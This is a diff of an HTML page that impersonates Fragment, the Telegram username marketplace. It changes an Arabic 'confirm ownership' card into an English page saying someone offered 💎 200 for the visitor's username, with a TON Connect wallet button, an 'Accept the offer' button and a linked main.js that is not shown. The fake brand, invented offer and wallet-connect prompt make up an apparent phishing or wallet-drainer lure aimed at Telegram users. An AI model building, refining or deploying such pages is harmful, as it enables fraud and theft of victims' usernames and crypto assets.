@@ -1,24 +1,92 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment | Connect Wallet</title>
+    <title>Fragment — Username</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 2rem; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
-        #connect-button { margin-top: 20px; }
-        .btn-confirm { background: #0088cc; border: none; padding: 12px 25px; color: white; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; display: none; }
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --blue-btn: #0088cc;
+            --text-gray: #94a3b8;
+            --status-green: #10b981;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 20px; display: flex; justify-content: center;
+        }
+        .container { width: 100%; max-width: 450px; }
+        .header { display: flex; align-items: center; margin-bottom: 30px; }
+        .logo { font-weight: bold; font-size: 20px; letter-spacing: 1px; display: flex; align-items: center; }
+        .logo svg { margin-right: 10px; fill: white; }
+        
+        .main-title { text-align: center; font-size: 28px; font-weight: bold; margin-bottom: 5px; }
+        .status-badge { 
+            background: rgba(16, 185, 129, 0.2); 
+            color: var(--status-green); 
+            padding: 2px 8px; border-radius: 4px; font-size: 14px; 
+            display: inline-block; margin-left: 10px; vertical-align: middle;
+        }
+
+        .offer-box {
+            background: #1e293b; border-radius: 12px; padding: 20px; margin-top: 25px;
+            border: 1px solid #334155;
+        }
+        .offer-title { color: var(--text-gray); font-size: 14px; margin-bottom: 15px; }
+        .offer-desc { font-size: 15px; line-height: 1.5; margin-bottom: 15px; }
+        .offer-desc span { color: var(--blue-btn); font-weight: bold; }
+
+        .info-row { display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid #334155; font-size: 15px; }
+        .info-label { color: var(--text-gray); }
+        .info-value { color: #60a5fa; cursor: pointer; }
+
+        #confirm-btn {
+            background: var(--blue-btn); color: white; border: none; width: 100%;
+            padding: 16px; border-radius: 10px; font-size: 17px; font-weight: bold;
+            margin-top: 30px; cursor: pointer; transition: 0.3s;
+        }
+        #confirm-btn:active { transform: scale(0.98); }
+        
+        /* إخفاء زر التوصيل الافتراضي وجعله متناسقاً */
+        #connect-button { margin-top: 20px; display: flex; justify-content: center; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://fragment.com/img/fragment_logo.svg" width="150" alt="Fragment">
-        <h3>تأكيد ملكية اليوزر</h3>
-        <p>قم بربط محفظتك لتأكيد يوزر <span id="target-user">@...</span></p>
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 2L2 19.77h20L12 2zm0 3.54l6.92 12.23H5.08L12 5.54z"/></svg>
+                FRAGMENT
+            </div>
+        </div>
+
+        <div class="main-title">
+            <span id="target-user">username</span>.t.me
+            <span class="status-badge">Claimed</span>
+        </div>
+
+        <div class="offer-box">
+            <div class="offer-title">What is this?</div>
+            <div class="offer-desc">
+                Someone offered <span>💎 200</span> for your username. If the price suits you, press "Accept the offer".
+            </div>
+        </div>
+
+        <div class="info-row">
+            <div class="info-label">Telegram Username</div>
+            <div class="info-value">@<span id="label-user">username</span></div>
+        </div>
+        <div class="info-row">
+            <div class="info-label">Web Address</div>
+            <div class="info-value">t.me/<span id="label-user2">username</span></div>
+        </div>
+
         <div id="connect-button"></div>
-        <button id="confirm-btn" class="btn-confirm">Confirm & Claim</button>
+        <button id="confirm-btn">Accept the offer</button>
     </div>
 
     <script src="main.js"></script>
